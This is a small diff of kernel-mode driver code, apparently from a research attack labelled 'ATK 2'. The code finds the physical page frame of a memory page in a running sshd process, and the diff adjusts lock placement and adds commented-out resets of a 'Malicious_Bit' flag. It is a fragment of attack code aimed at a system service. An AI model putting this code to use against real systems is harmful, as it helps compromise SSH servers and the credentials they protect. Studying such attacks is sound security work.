@@ -859,10 +859,11 @@ if (attack_num < 2) {
 					if (rets != RM_OK)
 					{
 					   	DbgPrint("ATK 2: failed to allocate buffer for page nums in kernel mode!\n");
+//							counter = 0;
+//							Malicious_Bit = 0;
 					   	return rets;
 					}
 					DbgPrint("ATK 2: allocated buffer for page nums\n");
-					down_read(&mm->mmap_sem);
 
 					// Currently hard-coded sshd page addr:
 //					int pid = 2923;
@@ -870,12 +871,14 @@ if (attack_num < 2) {
 					int pid = info_buffer->pid;
 					unsigned long sshd_page_addr = info_buffer->sshd_page_addr;
 
+					down_read(&mm->mmap_sem);
 						ret = get_pfn_of_virtual_address_pid(sshd_page_addr, &page_number, pid);
-
 					up_read(&mm->mmap_sem);
 		    		if (ret < 0)
 		    		{
 		    			DbgPrint("ATK 2: failed to get user pages\n");
+//              counter = 0;
+//						  Malicious_Bit = 0;
 		    			return RM_ERR_INVALID_ADDRESS;
 		    		}
 		    		DbgPrint("ATK 2: Got PFN\n");
